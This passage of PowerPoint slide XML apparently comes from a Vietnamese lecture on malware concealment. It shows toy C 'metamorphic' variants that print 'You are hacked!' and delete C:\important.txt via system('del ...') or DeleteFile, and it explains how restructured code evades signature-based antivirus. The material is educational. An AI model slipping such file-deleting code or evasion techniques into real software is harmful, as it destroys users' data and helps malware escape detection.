              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27836766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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Metamorphism:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lần 2 (sau biến đổi metamorphic):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>#include &lt;stdio.h&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>#include &lt;stdlib.h&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>main() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    // Thay đổi cấu trúc lệnh nhưng chức năng giống hệt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    char *msg = "You are hacked!\n";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    for(int i = 0; msg[i] != '\0'; i++) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>{ putchar(msg[i]); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>// Xóa file bằng cách gọi system thay vì remove()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    system("del C:\\important.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>");</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18703093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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Metamorphism:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lần </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3 (một biến thể khác nữa):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>#include &lt;windows.h&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>main() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    MessageBoxA(0, "You are hacked!", "Alert", 0);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    DeleteFile("C:\\important.txt");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    return 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" i="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9292656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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Metamorphism:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Điểm</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chung</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Cả</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>phiên</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bản</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đều</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thực</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hiện</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cùng</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một</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mục</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tiêu</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hiển</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thị</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cảnh</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báo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>xóa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> file)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Điểm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="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khác</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Cách</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viết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> code, API, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hàm</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gọi</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hoàn</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toàn</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khác</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nhau</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khiến</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chữ</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ký</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (signature) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> antivirus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>không</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còn</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hiệu</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quả</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Metamorphic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>malware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>không</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chỉ</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đổi</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hình</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thức</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tên</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biến</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lệnh</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mà</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còn</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tái</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cấu</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trúc</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hoàn</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toàn</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mã</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nguồn</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thậm</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chí</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sinh</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ra</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một</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phiên</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bản</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mới</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của</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chính</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nó</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Điều</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này</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làm</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công</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cụ</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quét</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dựa</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trên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> signature </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>rất</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khó</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phát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36617045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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Obfuscation (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>làm</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rối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
